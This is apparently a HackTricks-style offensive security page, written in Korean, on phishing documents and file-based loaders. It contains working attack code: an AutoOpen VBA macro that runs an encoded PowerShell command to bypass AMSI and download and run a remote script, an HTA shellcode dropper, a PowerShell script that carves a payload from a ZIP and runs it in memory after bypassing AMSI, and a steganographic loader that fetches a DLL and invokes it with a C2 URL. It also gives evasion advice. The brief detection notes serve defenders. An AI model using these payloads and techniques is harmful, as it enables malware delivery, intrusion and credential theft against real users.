# Phishing 파일 및 문서

{{#include ../../banners/hacktricks-training.md}}

## Office 문서

Microsoft Word는 파일을 열기 전에 파일 데이터 유효성 검사를 수행합니다. 데이터 유효성 검사는 OfficeOpenXML 표준에 따라 데이터 구조 식별의 형태로 수행됩니다. 데이터 구조 식별 중에 오류가 발생하면 분석 중인 파일은 열리지 않습니다.

보통 매크로를 포함한 Word 파일은 `.docm` 확장자를 사용합니다. 그러나 파일 확장자를 변경해 파일 이름을 바꾸어도 매크로 실행 기능을 유지하는 것이 가능합니다.\
예를 들어, RTF 파일은 설계상 매크로를 지원하지 않지만, DOCM 파일을 RTF로 이름을 바꾸면 Microsoft Word가 해당 파일을 처리하여 매크로를 실행할 수 있습니다.\
동일한 내부 구조와 메커니즘이 Microsoft Office Suite의 모든 소프트웨어(Excel, PowerPoint 등)에 적용됩니다.

다음 명령을 사용하여 일부 Office 프로그램에서 실행될 확장자를 확인할 수 있습니다:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### 외부 이미지 로드

Go to: _Insert --> Quick Parts --> Field_\
_**카테고리**: Links and References, **Filed names**: includePicture, and **파일 이름 또는 URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

문서에서 macros를 사용해 임의의 code를 실행할 수 있다.

#### 자동 로드 함수

더 흔할수록 AV가 탐지할 가능성이 높아진다.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### 수동으로 메타데이터 제거

다음으로 이동: **File > Info > Inspect Document > Inspect Document**, 그러면 Document Inspector가 표시됩니다. **Inspect**를 클릭한 다음 **Document Properties and Personal Information** 옆의 **Remove All**을 클릭하세요.

#### Doc Extension

작업이 끝나면 **Save as type** 드롭다운을 선택하고 형식을 **`.docx`**에서 **Word 97-2003 `.doc`**로 변경하세요.\
이렇게 하는 이유는 **`.docx`** 안에는 매크로를 저장할 수 없고 매크로 사용 가능한 **`.docm`** 확장자에는 낙인(stigma)이 있어(예: 썸네일 아이콘에 큰 `!`가 표시되고 일부 웹/이메일 게이트웨이가 이를 전부 차단함) 따라서 이 **레거시 `.doc` 확장자가 최선의 타협**입니다.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

HTA는 HTML과 스크립팅 언어(예: VBScript 및 JScript)를 결합한 Windows 프로그램입니다. 이는 사용자 인터페이스를 생성하고 브라우저의 보안 모델 제약을 받지 않는 "fully trusted" 애플리케이션으로 실행됩니다.

HTA는 **`mshta.exe`**를 사용해 실행되며, 보통 **Internet Explorer**와 함께 **설치**되어 있기 때문에 **`mshta`는 IE에 의존**합니다. 따라서 Internet Explorer가 제거되어 있다면 HTA는 실행할 수 없습니다.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM 인증 강제하기

원격으로 NTLM 인증을 **강제하는 방법**은 여러 가지가 있다. 예를 들어, 사용자가 접근할 이메일이나 HTML에 **보이지 않는 이미지**를 추가하거나(HTTP MitM 포함?), 피해자에게 폴더를 여는 것만으로 **인증을 유발하는 파일 주소**를 보낼 수 있다.

**다음 페이지들에서 이러한 아이디어와 더 많은 내용을 확인하라:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

해시나 인증 정보를 훔치는 것뿐만 아니라 **NTLM relay 공격을 수행할 수 있다는 점**을 잊지 말자:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

매우 효과적인 캠페인은 두 개의 정상적인 미끼 문서(PDF/DOCX)와 악성 .lnk 를 포함한 ZIP을 전달한다. 핵심은 실제 PowerShell loader가 고유한 마커 이후 ZIP의 raw bytes 안에 저장되어 있고, .lnk가 이를 carve하여 메모리에서 완전히 실행한다는 것이다.

Typical flow implemented by the .lnk PowerShell one-liner:

1) Desktop, Downloads, Documents, %TEMP%, %ProgramData%, 현재 작업 디렉터리의 상위 폴더 등 일반 경로에서 원본 ZIP을 찾는다.
2) ZIP 바이트를 읽어 하드코딩된 마커(e.g., xFIQCV)를 찾는다. 마커 이후의 모든 것이 임베디드된 PowerShell 페이로드다.
3) ZIP을 %ProgramData%로 복사하고, 그곳에서 추출한 뒤 미끼 .docx를 열어 정당해 보이게 한다.
4) 현재 프로세스에 대해 AMSI를 우회한다: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 다음 단계(예: 모든 # 문자를 제거)를 디옵셔케이트하고 메모리에서 실행한다.

Example PowerShell skeleton to carve and run the embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- 배포는 종종 평판이 좋은 PaaS 하위 도메인(예: *.herokuapp.com)을 악용하며 페이로드를 차단할 수 있다(예: IP/UA에 따라 정상 ZIP 파일 제공).
- 다음 단계에서는 흔히 base64/XOR shellcode를 복호화하여 디스크 흔적을 최소화하기 위해 Reflection.Emit + VirtualAlloc을 통해 실행한다.

Persistence used in the same chain
- Microsoft Web Browser control의 COM TypeLib hijacking으로, IE/Explorer 또는 이를 임베딩한 앱이 페이로드를 자동으로 재실행하게 한다. 자세한 내용과 바로 사용할 수 있는 명령은 다음을 참조:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- 아카이브 데이터 끝에 ASCII 마커 문자열(예: xFIQCV)이 추가된 ZIP 파일.
- .lnk가 상위/사용자 폴더를 열거하여 ZIP을 찾아 미끼 문서를 연다.
- AMSI 변조 via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- 신뢰된 PaaS 도메인에 호스팅된 링크로 끝나는 장기 실행 비즈니스 스레드.

## Steganography-delimited payloads in images (PowerShell stager)

최근 로더 체인은 난독화된 JavaScript/VBS를 전달하여 Base64 PowerShell stager를 복호화하고 실행하게 한다. 해당 stager는 이미지(종종 GIF)를 다운로드하는데, 그 이미지에는 고유한 시작/종료 마커 사이에 평문으로 숨겨진 Base64-encoded .NET DLL이 포함되어 있다. 스크립트는 이러한 구분자(delimiters)를 검색(실제 사례 예: «<<sudo_png>> … <<sudo_odt>>>»), 사이의 텍스트를 추출하여 Base64로 디코딩해 바이트로 변환하고, 어셈블리를 메모리에서 로드한 다음 C2 URL을 인수로 하여 알려진 진입 메서드를 호출한다.

Workflow
- Stage 1: 아카이브된 JS/VBS dropper → 내장된 Base64를 디코딩 → -nop -w hidden -ep bypass 옵션으로 PowerShell stager 실행.
- Stage 2: PowerShell stager → 이미지 다운로드, 마커로 구분된 Base64를 carving하여 .NET DLL을 메모리에서 로드하고 해당 메서드(e.g., VAI)를 C2 URL과 옵션을 전달하여 호출.
- Stage 3: Loader가 최종 페이로드를 가져와 일반적으로 process hollowing을 통해 신뢰된 바이너리(주로 MSBuild.exe)에 인젝션. process hollowing 및 trusted utility proxy execution에 대한 자세한 내용은 다음 참조:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell stego 페이로드 추출기 및 로더</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

노트
- This is ATT&CK T1027.003 (steganography/marker-hiding). Markers vary between campaigns.
- AMSI/ETW bypass and string deobfuscation은 어셈블리를 로드하기 전에 일반적으로 적용됩니다.
- 탐지: 다운로드된 이미지에서 알려진 구분자를 검색하고, PowerShell이 이미지를 접근하여 즉시 Base64 블롭을 디코딩하는 것을 식별합니다.

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

반복되는 초기 단계는 아카이브 안에 포함되어 전달되는 작고 강하게 난독화된 `.js` 또는 `.vbs`입니다. 그 유일한 목적은 내장된 Base64 문자열을 디코딩하고 `-nop -w hidden -ep bypass` 옵션으로 PowerShell을 실행하여 HTTPS를 통해 다음 단계를 부트스트랩하는 것입니다.

골격 로직 (추상):
- 자신의 파일 내용을 읽음
- 불필요한 문자열들 사이의 Base64 블롭을 찾음
- ASCII 형태의 PowerShell 코드로 디코딩
- `wscript.exe`/`cscript.exe`로 `powershell.exe`를 호출하여 실행

탐지 단서
- 아카이브된 JS/VBS 첨부파일이 명령줄에 `-enc`/`FromBase64String`를 포함하여 `powershell.exe`를 실행함.
- 사용자 임시 경로에서 `wscript.exe`가 `powershell.exe -nop -w hidden`을 실행함.

## Windows files to steal NTLM hashes

다음 페이지에서 **places to steal NTLM creds**를 확인하세요:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
